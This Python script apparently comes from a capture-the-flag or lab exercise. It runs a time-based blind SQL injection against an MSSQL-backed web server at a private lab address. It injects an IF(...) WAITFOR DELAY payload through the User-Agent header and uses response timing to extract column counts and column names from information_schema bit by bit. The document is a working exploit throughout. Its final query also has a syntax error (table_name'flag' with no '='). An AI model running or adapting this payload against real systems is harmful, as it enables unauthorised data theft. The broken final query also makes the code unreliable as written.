#!/usr/bin/python3

import requests
import time

# Define the length of time (in seconds) the server should
# wait if `q` is `true`
DELAY = 1
ip = "10.129.204.197"
# Evalutes `q` on the server side and returns `true` or `false`
def oracle(q):
    start = time.time()
    r = requests.get(
        f"http://{ip}:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

def dumpString(q, length):
    val = ""
    for i in range(1, length + 1):
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        val += chr(c)
    return val

def dumpNumber(q):
    length = 0
    for p in range(7):
        if oracle(f"({q})&{2**p}>0"):
            length |= 2**p
    return length

# Get Tables Length
query = "SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_CATALOG='digcraft' AND table_name='flag'"
num_columns = dumpNumber(query)
print(num_columns)
# Get Table Name
for i in range(num_columns):
    query = f"select LEN(column_name) from information_schema.columns where table_catalog='digcraft' AND table_name='flag' order by table_name offset {i} rows fetch next 1 rows only"
    column_name_length = dumpNumber(query)
    print(column_name_length)
    query = f"select column_name from information_schema.columns where table_catalog='digcraft' AND table_name'flag' order by table_name offset {i} rows fetch next 1 rows only"
    column_name = dumpString(query, column_name_length)
    print(column_name)